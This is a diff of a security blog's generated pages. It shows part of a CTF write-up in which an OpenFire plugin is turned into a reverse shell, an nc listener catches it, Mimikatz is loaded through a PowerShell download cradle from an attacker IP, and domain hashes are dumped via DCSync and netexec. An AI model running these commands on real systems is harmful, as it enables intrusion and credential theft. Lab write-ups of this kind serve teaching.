-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>git clone https://github.com/igniterealtime/openfire-exampleplugin.git
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>git clone https://github.com/igniterealtime/openfire-exampleplugin.git
 </span></span><span style="display:flex;"><span>cd openfire-exampleplugin
 </span></span></code></pre></div><p>We copy the <code>shell.jsp</code> to <code>exampleplugin-page.jsp</code> location for compilation</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>cp ../shell.jsp ./src/main/web/exampleplugin-page.jsp
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>cp ../shell.jsp ./src/main/web/exampleplugin-page.jsp
 </span></span></code></pre></div><p>We will need to install apache maven to compile this exploit, so if you don&rsquo;t have it already run the below to install it.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>sudo apt update <span style="color:#f92672">&amp;&amp;</span> sudo apt install maven -y
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>sudo apt update <span style="color:#f92672">&amp;&amp;</span> sudo apt install maven -y
 </span></span></code></pre></div><p>Now we need to create the package.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>mvn -B package
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>mvn -B package
 </span></span></code></pre></div><p>Once complete you should get a successful build message:</p>
 <ul>
 <li><figure><img src="/ox-hugo/2025-04-25-115351_.png">
@@ -1501,10 +1501,10 @@ We can see that we can export the data and it will contain clear text passwords 
 </li>
 </ul>
 <p>Next we put the plugin into the correct structure for uploading to OpenFire.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>cp ./target/exampleplugin.jar exampleplugin.zip; zip -ur exampleplugin.zip ./plugin.xml ./readme.html; mv exampleplugin.zip ./target/exampleplugin.jar;
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>cp ./target/exampleplugin.jar exampleplugin.zip; zip -ur exampleplugin.zip ./plugin.xml ./readme.html; mv exampleplugin.zip ./target/exampleplugin.jar;
 </span></span></code></pre></div><p>The correct file is <code>exampleplugin.jar</code> located in <code>target/</code></p>
 <p>Start a listener:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>rlwrap -cAr nc -nvlp <span style="color:#ae81ff">6969</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>rlwrap -cAr nc -nvlp <span style="color:#ae81ff">6969</span>
 </span></span></code></pre></div><p>Next we upload the exploit</p>
 <ul>
 <li><figure><img src="/ox-hugo/2025-04-21-110351_.png">
@@ -1512,7 +1512,7 @@ We can see that we can export the data and it will contain clear text passwords 
 </li>
 </ul>
 <p>Now we finally trigger the plugin so our reverse shell is active. As this version is not vulnerable to the traversal exploit we can just call it straight in the browser from an authenticated session</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>http://localhost:8000/plugins/exampleplugin/exampleplugin-page.jsp?
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>http://localhost:8000/plugins/exampleplugin/exampleplugin-page.jsp?
 </span></span></code></pre></div><ul>
 <li><figure><img src="/ox-hugo/2025-04-25-120144_.png">
 </figure>
@@ -1527,7 +1527,7 @@ We can see that we can export the data and it will contain clear text passwords 
 <h4 id="stabilize-shell">Stabilize Shell:</h4>
 <p>You will probably notice the shell is quite unstable. To rectify this we can easily generate a base64 encoded shell on <a href="https://www.revshells.com/"  target="_blank" rel="noreferrer nofollow">revshells.com</a>
  and a new listener and catch a new shell from our existing unstable shell.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>powershell -e [<span style="color:#66d9ef">base64</span>]
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>powershell -e [<span style="color:#66d9ef">base64</span>]
 </span></span></code></pre></div><ul>
 <li><figure><img src="/ox-hugo/2025-04-25-133036_.png">
 </figure>
@@ -1538,17 +1538,17 @@ We can see that we can export the data and it will contain clear text passwords 
 <p>First lets use a download cradle to load mimikatz into memory using the <a href="https://github.com/g4uss47/Invoke-Mimikatz"  target="_blank" rel="noreferrer nofollow">Invoke-Mimikatz.ps1</a>
  script.</p>
 <p>Get script</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>wget https://raw.githubusercontent.com/g4uss47/Invoke-Mimikatz/refs/heads/master/Invoke-Mimikatz.ps1
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>wget https://raw.githubusercontent.com/g4uss47/Invoke-Mimikatz/refs/heads/master/Invoke-Mimikatz.ps1
 </span></span></code></pre></div><p>Start a server to serve the script on our host:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>python3 -m http.server <span style="color:#ae81ff">9000</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>IEX (New-Object Net.Webclient).downloadstring(<span style="color:#e6db74">&#34;http://10.10.14.31:9000/Invoke-Mimikatz.ps1&#34;</span>)
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>python3 -m http.server <span style="color:#ae81ff">9000</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>IEX (New-Object Net.Webclient).downloadstring(<span style="color:#e6db74">&#34;http://10.10.14.31:9000/Invoke-Mimikatz.ps1&#34;</span>)
 </span></span></code></pre></div><ul>
 <li><figure><img src="/ox-hugo/2025-04-25-122920_.png">
 </figure>
 </li>
 </ul>
 <p>Then lets get the administrator hash as that will make life easier.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>Invoke-Mimikatz -Command <span style="color:#e6db74">&#39;&#34;privilege::debug&#34; &#34;lsadump::dcsync /domain:jab.htb /user:administrator&#34;&#39;</span>
 </span></span></code></pre></div><ul>
 <li><figure><img src="/ox-hugo/2025-04-25-131425_.png">
@@ -1556,7 +1556,7 @@ We can see that we can export the data and it will contain clear text passwords 
 </li>
 </ul>
 <p>Lets validate the hash:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>netexec smb $box -u $user -H $hash --shares
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>netexec smb $box -u $user -H $hash --shares
 </span></span></code></pre></div><p>It&rsquo;s valid as expected, but it&rsquo;s always good to check.</p>
 <ul>
 <li><figure><img src="/ox-hugo/2025-04-25-131741_.png">
@@ -1566,9 +1566,9 @@ We can see that we can export the data and it will contain clear text passwords 
 <h3 id="dumping-ntds-dot-dit-dcsync-attack">Dumping NTDS.dit/DCSync attack:</h3>
 <p>You may be wondering why we didnt&rsquo; just do this with mimikatz, well the host is quite slow and the shell not too reliable so if we get a hash we can use linux based tools to get this information remotely.</p>
 <p>Perform DCSync attack using netexec to get all the hashes, this will take a WHILE so be patient.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>netexec smb $box -u $user -H $hash -M ntdsutil
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>netexec smb $box -u $user -H $hash -M ntdsutil
 </span></span></code></pre></div><p>Extract all hashes from netexec</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#66d9ef">for</span> file in /home/kali/.nxc/logs/DC01_10.129.239.38_2025-04-25_131914.ntds; <span style="color:#66d9ef">do</span> cat <span style="color:#e6db74">&#34;</span>$file<span style="color:#e6db74">&#34;</span> | cut -d <span style="color:#e6db74">&#39;:&#39;</span> -f1,2,4 --output-delimiter<span style="color:#f92672">=</span><span style="color:#e6db74">&#39; &#39;</span> | awk <span style="color:#e6db74">&#39;{print $3, $2, $1}&#39;</span>; printf <span style="color:#e6db74">&#39;\n&#39;</span>; <span style="color:#66d9ef">done</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#66d9ef">for</span> file in /home/kali/.nxc/logs/DC01_10.129.239.38_2025-04-25_131914.ntds; <span style="color:#66d9ef">do</span> cat <span style="color:#e6db74">&#34;</span>$file<span style="color:#e6db74">&#34;</span> | cut -d <span style="color:#e6db74">&#39;:&#39;</span> -f1,2,4 --output-delimiter<span style="color:#f92672">=</span><span style="color:#e6db74">&#39; &#39;</span> | awk <span style="color:#e6db74">&#39;{print $3, $2, $1}&#39;</span>; printf <span style="color:#e6db74">&#39;\n&#39;</span>; <span style="color:#66d9ef">done</span>
 </span></span></code></pre></div><ul>
 <li><figure><img src="/ox-hugo/2025-04-25-132240_.png">
 </figure>
@@ -1761,6 +1761,13 @@ document.addEventListener("DOMContentLoaded", function() {
 <script>
 window.store = {
     
+    "\/\/uildDrafts:1313\/tags\/ansible\/": {
+        "title": "Ansible",
+        "tags": [],
+        "content": "", 
+        "url": "\/\/uildDrafts:1313\/tags\/ansible\/"
+    },
+    
     "\/\/uildDrafts:1313\/author\/": {
         "title": "Author",
         "tags": [],
@@ -1768,11 +1775,11 @@ window.store = {
         "url": "\/\/uildDrafts:1313\/author\/"
     },
     
-    "\/\/uildDrafts:1313\/tags\/blind\/": {
-        "title": "Blind",
+    "\/\/uildDrafts:1313\/tags\/automation\/": {
+        "title": "Automation",
         "tags": [],
         "content": "", 
-        "url": "\/\/uildDrafts:1313\/tags\/blind\/"
+        "url": "\/\/uildDrafts:1313\/tags\/automation\/"
     },
     
     "\/\/uildDrafts:1313\/author\/bloodstiller\/": {
@@ -1787,6 +1794,55 @@ window.store = {
         "tags": [],
         "content": "", 
         "url": "\/\/uildDrafts:1313\/"
+    },
+    
+    "\/\/uildDrafts:1313\/tags\/dotfiles\/": {
+        "title": "Dotfiles",
+        "tags": [],
+        "content": "", 
+        "url": "\/\/uildDrafts:1313\/tags\/dotfiles\/"
+    },
+    
+    "\/\/uildDrafts:1313\/tags\/kali\/": {
+        "title": "Kali",
+        "tags": [],
+        "content": "", 
+        "url": "\/\/uildDrafts:1313\/tags\/kali\/"
+    },
+    
+    "\/\/uildDrafts:1313\/tags\/qemu\/": {
+        "title": "Qemu",
+        "tags": [],
+        "content": "", 
+        "url": "\/\/uildDrafts:1313\/tags\/qemu\/"
+    },
+    
+    "\/\/uildDrafts:1313\/tools\/security-newsroom-plugin\/security-newsroom-obsidian-plugin\/": {
+        "title": "Security Newsroom Obsidian Plugin Release",
+        "tags": ["kali","automation","qemu","ansible","dotfiles",],
+        "content": "Security Newsroom Obsidian Plugin Release I\u0026rsquo;ve been quiet for a while. Work has been busy \u0026amp; I have been doing some other projects that I can\u0026rsquo;t get into\u0026hellip;\u0026hellip;\nI\u0026rsquo;ve made the switch from my beloved eMacs to obsidian over the last few months and apart from the first week it\u0026rsquo;s been relatively painless. I\u0026rsquo;ve managed to recreate 99% of all eMacs functionality in obsidian (that\u0026rsquo;s functionality I used, not all of eMacs functionality as that would not be possible.)\nOne thing that I have found myself needing is an easy way to keep up with security related news. As the landscape is constantly evolving and growing and there a million different sources to get information from I got bored of jumping around so I thought \u0026ldquo;what if it was just in obsidian\u0026rdquo;. I use obsidian as my web-clipper anyone so let\u0026rsquo;s just put the functionality in here (I say here as I am writing the post in Obsidian)\nSo I decided to create the security newsroom plugin. https://github.com/bloodstiller/obsidian-security-newsroom I\u0026rsquo;ve created a pull request for it to be placed into the official community plugins but so far it has not.\nIt essentially pulls from lots of security resources and allows you to filter, save \u0026amp; clip the whole articles directly within obsidian.\nFull video showing how it works. At the moment as it\u0026rsquo;s not currently approved in the obsidian store if you want to use it you will have to manually add a folder called in your .obsidian/plugins folder called security-newsroom and place the main.js, manifest.json \u0026amp; styles.css from the repo and then load the plugin.\n", 
+        "url": "\/\/uildDrafts:1313\/tools\/security-newsroom-plugin\/security-newsroom-obsidian-plugin\/"
+    },
+    
+    "\/\/uildDrafts:1313\/tags\/": {
+        "title": "Tags",
+        "tags": [],
+        "content": "", 
+        "url": "\/\/uildDrafts:1313\/tags\/"
+    },
+    
+    "\/\/uildDrafts:1313\/tools\/": {
+        "title": "Tools",
+        "tags": [],
+        "content": "", 
+        "url": "\/\/uildDrafts:1313\/tools\/"
+    },
+    
+    "\/\/uildDrafts:1313\/tags\/blind\/": {
+        "title": "Blind",
+        "tags": [],
+        "content": "", 
+        "url": "\/\/uildDrafts:1313\/tags\/blind\/"
     },
     
     "\/\/uildDrafts:1313\/tags\/ctf-writeup\/": {
@@ -1866,13 +1922,6 @@ window.store = {
         "url": "\/\/uildDrafts:1313\/portswigger\/sqli_lab_15\/"
     },
     
-    "\/\/uildDrafts:1313\/tags\/": {
-        "title": "Tags",
-        "tags": [],
-        "content": "", 
-        "url": "\/\/uildDrafts:1313\/tags\/"
-    },
-    
     "\/\/uildDrafts:1313\/tags\/waf\/": {
         "title": "Waf",
         "tags": [],
@@ -1881,7 +1930,7 @@ window.store = {
     },
     
     "\/\/uildDrafts:1313\/tags\/web-exploitation\/": {
-        "title": "Web-Exploitation",
+        "title": "Web Exploitation",
         "tags": [],
         "content": "", 
         "url": "\/\/uildDrafts:1313\/tags\/web-exploitation\/"
@@ -2294,7 +2343,7 @@ window.store = {
     },
     
     "\/\/uildDrafts:1313\/tags\/llm\/": {
-        "title": "Llm",
+        "title": "LLM",
         "tags": [],
         "content": "", 
         "url": "\/\/uildDrafts:1313\/tags\/llm\/"
@@ -2749,7 +2798,7 @@ window.store = {
     },
     
     "\/\/uildDrafts:1313\/tags\/msi\/": {
-        "title": "MSI",
+        "title": "Msi",
         "tags": [],
         "content": "", 
         "url": "\/\/uildDrafts:1313\/tags\/msi\/"
@@ -3145,13 +3194,6 @@ window.store = {
         "tags": [],
         "content": "", 
         "url": "\/\/uildDrafts:1313\/tags\/tools\/"
-    },
-    
-    "\/\/uildDrafts:1313\/tools\/": {
-        "title": "Tools",
-        "tags": [],
-        "content": "", 
-        "url": "\/\/uildDrafts:1313\/tools\/"
     },
     
     "\/\/uildDrafts:1313\/tags\/vulnerability-assessment\/": {
@@ -3603,7 +3645,7 @@ window.store = {
     },
     
     "\/\/uildDrafts:1313\/tags\/ssrf\/": {
-        "title": "Ssrf",
+        "title": "SSRF",
         "tags": [],
         "content": "", 
         "url": "\/\/uildDrafts:1313\/tags\/ssrf\/"
@@ -4113,46 +4155,11 @@ window.store = {
         "url": "\/\/uildDrafts:1313\/homelab\/20250220118-nixos-homelab\/"
     },
     
-    "\/\/uildDrafts:1313\/tags\/ansible\/": {
-        "title": "Ansible",
-        "tags": [],
-        "content": "", 
-        "url": "\/\/uildDrafts:1313\/tags\/ansible\/"
-    },
-    
     "\/\/uildDrafts:1313\/tools\/automatingqemukalivmansible\/": {
         "title": "Automating Kali Linux VM Setup: A Comprehensive Guide to QEMU and Ansible Integration",
         "tags": ["kali","automation","qemu","ansible","dotfiles",],
         "content": "As a cybersecurity enthusiast and productivity junkie, I\u0026rsquo;ve always been fascinated by the power of automation. Recently, I decided to streamline my process of setting up Kali Linux virtual machines using QEMU and Ansible. In this article, I\u0026rsquo;ll walk you through how I\u0026rsquo;ve automated the creation and configuration of Kali VMs, complete with my preferred dotfiles and tools.\nThe Need for Automation If you\u0026rsquo;re like me, you probably find yourself creating new Kali VMs frequently for various projects or testing environments. The process of setting up a new VM, updating the system, installing your favorite tools, and configuring your environment can be time-consuming and repetitive. That\u0026rsquo;s where automation comes in handy. You can repurpose this setup for other projects, just change the Ansible playbook and dotfiles.\nBenefits and Challenges This automation setup offers several advantages:\nConsistent environment across all VMs Rapid deployment of new instances Version-controlled configuration (infrastructure as code) Easy sharing and collaboration Some challenges I encountered:\nVirtioFS setup complexity Ansible role organization Package version management Dotfiles synchronization But the benefits far outweigh the initial setup effort.\nPrerequisites Choose your preferred virtualization provider:\nVirtualBox Setup VirtualBox Vagrant Ansible QEMU/KVM Setup (Linux only) (My preferred setup) QEMU/KVM (≥ 4.2) Libvirt (≥ 6.2.0) Vagrant Ansible For QEMU/KVM shared folder support:\nHost: Linux kernel ≥ 5.4\nGuest: Linux kernel ≥ 5.4\nThere is some additional setup required for the vagrant-libvirt plugin so would advise you checkout QEMU/KVM Setup Guide Unable to resolve dependency vagrant-libvirterror: +Update+ 21/02/2025 I recently ran an update and encountered an issue where it refused to launch new VM\u0026rsquo;s. I received an error similar to the below (it was not exactly the same as I had a crash shortly after). Error message given during initialization: Unable to resolve dependency: user requested 'vagrant-libvirt (= 0.12.2)' after alot of searching I found this post I found following the steps resolved the issue. vagrant plugin repair vagrant plugin expunge --reinstall vagrant plugin update VAGRANT_DISABLE_STRICT_DEPENDENCY_ENFORCEMENT=1 vagrant plugin install vagrant-libvirt The Automation Stack My automation setup consists of three main components:\nVagrant for VM provisioning QEMU/KVM for virtualization Ansible for configuration management Let\u0026rsquo;s dive into each component.\n1. Vagrant with QEMU/KVM I chose QEMU/KVM over VirtualBox for several reasons:\nBetter performance on Linux hosts Once you have used KVM/QEMU you will never go back to VirtualBox etc. Native virtualization support VirtioFS for efficient file sharing The Vagrantfile handles:\nVM resource allocation (RAM, CPU) Network configuration Shared folder setup with VirtioFS Ansible provisioner integration Here\u0026rsquo;s the the Vagrantfile:\n# -*- mode: ruby -*- # vi: set ft=ruby : Vagrant.configure(\u0026#34;2\u0026#34;) do |config| config.vm.box = \u0026#34;kalilinux/rolling\u0026#34; config.vm.hostname = \u0026#34;kali-vm\u0026#34; # Set hostname inside VM # Disable the default share config.vm.synced_folder \u0026#34;.\u0026#34;, \u0026#34;/vagrant\u0026#34;, disabled: true # Force libvirt provider ENV[\u0026#39;VAGRANT_DEFAULT_PROVIDER\u0026#39;] = \u0026#39;libvirt\u0026#39; # QEMU/libvirt specific settings config.vm.provider :libvirt do |libvirt| libvirt.memory = 8192 libvirt.cpus = 4 libvirt.graphics_type = \u0026#34;spice\u0026#34; libvirt.video_type = \u0026#34;qxl\u0026#34; libvirt.title = \u0026#34;Kali Linux VM\u0026#34; # Set VM title in libvirt libvirt.description = \u0026#34;Kali Linux VM for Security Testing\u0026#34; # Optional description # Enable shared memory for VirtioFS libvirt.memorybacking :access, :mode =\u0026gt; \u0026#34;shared\u0026#34; end # Configure shared folders using VirtioFS config.vm.synced_folder \u0026#34;/home/martin/.config/tmuxinator\u0026#34;, \u0026#34;/home/vagrant/.config/tmuxinator\u0026#34;, type: \u0026#34;virtiofs\u0026#34; config.vm.synced_folder \u0026#34;/home/martin/Dropbox/40-49_Career/45-KaliShared/45.02-LinuxTools\u0026#34;, \u0026#34;/home/vagrant/linuxTools\u0026#34;, type: \u0026#34;virtiofs\u0026#34; config.vm.synced_folder \u0026#34;/home/martin/Dropbox/40-49_Career/45-KaliShared/45.01-WindowsTools\u0026#34;, \u0026#34;/home/vagrant/windowsTools\u0026#34;, type: \u0026#34;virtiofs\u0026#34; config.vm.synced_folder \u0026#34;/home/martin/Dropbox/40-49_Career\u0026#34;, \u0026#34;/home/vagrant/Dropbox/40-49_Career\u0026#34;, type: \u0026#34;virtiofs\u0026#34; # Network settings config.vm.network \u0026#34;private_network\u0026#34;, ip: \u0026#34;192.168.57.11\u0026#34; config.ssh.forward_x11 = true # Provisioning configuration for Ansible config.vm.provision \u0026#34;ansible\u0026#34; do |ansible| ansible.playbook = \u0026#34;../../Ansible/configure-kali.yml\u0026#34; end end 2. Ansible Configuration Ansible automates the entire VM setup process. The main playbook handles:\nSystem updates and package installation Development tools setup Security tools installation Terminal environment configuration (Alacritty, Tmux) Editor setup (Doom Emacs) Dotfiles deployment Here\u0026rsquo;s the main Ansible playbook:\n--- - name: Configure Kali Linux hosts: all become: yes # This is equivalent to using sudo vars: user_home: \u0026#34;/home/vagrant\u0026#34; docker_gpg_key_url: \u0026#34;https://download.docker.com/linux/debian/gpg\u0026#34; docker_repo: \u0026#34;deb [arch=amd64 signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/debian bookworm stable\u0026#34; tasks: - name: Update apt cache apt: update_cache: yes cache_valid_time: 3600 - name: Download Iosevka Nerd Font (be patient big file!) get_url: url: https://github.com/ryanoasis/nerd-fonts/releases/download/v3.3.0/Iosevka.zip dest: /tmp/Iosevka.zip mode: \u0026#39;0644\u0026#39; - name: Install unzip if not present apt: name: unzip state: present - name: Extract Iosevka font unarchive: src: /tmp/Iosevka.zip dest: \u0026#34;/usr/local/share/fonts/\u0026#34; remote_src: yes owner: vagrant group: vagrant - name: Update font cache command: fc-cache -fv become_user: vagrant - name: Install base packages apt: name: - eza - alacritty - git - bat - seclists - git - emacs - ripgrep - fd-find state: present - name: Create docker GPG directory file: path: /etc/apt/keyrings state: directory mode: \u0026#39;0755\u0026#39; - name: Check if Docker GPG key exists stat: path: /etc/apt/keyrings/docker.gpg register: docker_gpg - name: Add Docker GPG key shell: | curl -fsSL {{ docker_gpg_key_url }} | gpg --dearmor -o /etc/apt/keyrings/docker.gpg when: not docker_gpg.stat.exists - name: Check if Docker repository exists stat: path: /etc/apt/sources.list.d/docker.list register: docker_repo_file - name: Add Docker repository copy: content: \u0026#34;{{ docker_repo }}\u0026#34; dest: /etc/apt/sources.list.d/docker.list when: not docker_repo_file.stat.exists - name: Install Docker packages apt: name: - docker-ce - docker-ce-cli - containerd.io update_cache: yes state: present - name: Download Starship install script get_url: url: https://starship.rs/install.sh dest: /tmp/starship-install.sh mode: \u0026#39;0755\u0026#39; register: download_script - name: Install Starship shell: /tmp/starship-install.sh --yes args: creates: /usr/local/bin/starship when: download_script is success async: 180 # 5 minute timeout poll: 5 # Check every 5 seconds - name: Install oh-my-zsh become_user: vagrant shell: sh -c \u0026#34;$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)\u0026#34; \u0026#34;\u0026#34; --unattended args: creates: \u0026#34;{{ user_home }}/.oh-my-zsh\u0026#34; - name: Install zsh plugins become_user: vagrant git: repo: \u0026#34;{{ item.repo }}\u0026#34; dest: \u0026#34;{{ user_home }}/.oh-my-zsh/custom/plugins/{{ item.name }}\u0026#34; loop: - { repo: \u0026#39;https://github.com/zsh-users/zsh-autosuggestions\u0026#39;, name: \u0026#39;zsh-autosuggestions\u0026#39; } - { repo: \u0026#39;https://github.com/zsh-users/zsh-syntax-highlighting.git\u0026#39;, name: \u0026#39;zsh-syntax-highlighting\u0026#39; } - { repo: \u0026#39;https://github.com/marlonrichert/zsh-autocomplete.git\u0026#39;, name: \u0026#39;zsh-autocomplete\u0026#39; } - { repo: \u0026#39;https://github.com/zdharma-continuum/fast-syntax-highlighting.git\u0026#39;, name: \u0026#39;fast-syntax-highlighting\u0026#39; } - name: Install tmuxinator gem: name: tmuxinator state: present - name: Clone Statistically Likely Usernames git: repo: https://github.com/insidetrust/statistically-likely-usernames.git dest: /usr/share/wordlists/statistically-likely-usernames - name: Download and install Kerbrute get_url: url: https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64 dest: /usr/local/bin/kerbrute mode: \u0026#39;0755\u0026#39; - name: Install build dependencies for Emacs apt: name: - build-essential - libgccjit-12-dev - libgnutls28-dev - libjansson4 - libjansson-dev - libncurses-dev - libsqlite3-dev - libgif-dev - libjpeg-dev - libpng-dev - libtiff5-dev - libxpm-dev - libwebp-dev - libgtk-3-dev - texinfo - autoconf - automake - pkg-config state: present install_recommends: no register: pkg_result retries: 3 delay: 5 until: pkg_result is success - name: Install tree-sitter separately apt: name: libtree-sitter-dev state: present register: tree_sitter_result retries: 3 delay: 5 until: tree_sitter_result is success - name: Check if Emacs 29.4 is installed command: emacs --version register: emacs_version ignore_errors: true changed_when: false - name: Clone Emacs repository git: repo: git://git.savannah.gnu.org/emacs.git dest: /tmp/emacs version: emacs-29.4 when: \u0026#34;emacs_version.rc != 0 or \u0026#39;29.4\u0026#39; not in emacs_version.stdout|default(\u0026#39;\u0026#39;)\u0026#34; - name: Run autogen shell: | cd /tmp/emacs ./autogen.sh when: \u0026#34;emacs_version.rc != 0 or \u0026#39;29.4\u0026#39; not in emacs_version.stdout|default(\u0026#39;\u0026#39;)\u0026#34; - name: Configure Emacs shell: | cd /tmp/emacs ./configure --with-native-compilation --with-json --with-tree-sitter --with-sqlite3 args: creates: /tmp/emacs/Makefile when: \u0026#34;emacs_version.rc != 0 or \u0026#39;29.4\u0026#39; not in emacs_version.stdout|default(\u0026#39;\u0026#39;)\u0026#34; - name: Build Emacs shell: | cd /tmp/emacs make -j$(nproc) args: creates: /tmp/emacs/src/emacs when: \u0026#34;emacs_version.rc != 0 or \u0026#39;29.4\u0026#39; not in emacs_version.stdout|default(\u0026#39;\u0026#39;)\u0026#34; async: 1800 poll: 15 - name: Install Emacs become: yes shell: | cd /tmp/emacs make install args: creates: /usr/local/bin/emacs when: \u0026#34;emacs_version.rc != 0 or \u0026#39;29.4\u0026#39; not in emacs_version.stdout|default(\u0026#39;\u0026#39;)\u0026#34; async: 900 poll: 15 - name: Install other base packages apt: name: - eza - alacritty - git - bat - seclists - ripgrep - fd-find state: present install_recommends: no - name: Setup dotfiles become_user: vagrant block: - name: Clone dotfiles git: repo: https://github.com/bloodstiller/kaliconfigs.git dest: \u0026#34;{{ user_home }}/.dotfiles\u0026#34; version: main # Or whatever branch you\u0026#39;re using update: yes # Ensures latest version is cloned clone: yes force: yes # This will overwrite local changes - name: Create required directories file: path: \u0026#34;{{ item }}\u0026#34; state: directory loop: - \u0026#34;{{ user_home }}/.doom.d\u0026#34; - \u0026#34;{{ user_home }}/.config\u0026#34; - name: Create symlinks file: src: \u0026#34;{{ item.src }}\u0026#34; dest: \u0026#34;{{ item.dest }}\u0026#34; state: link 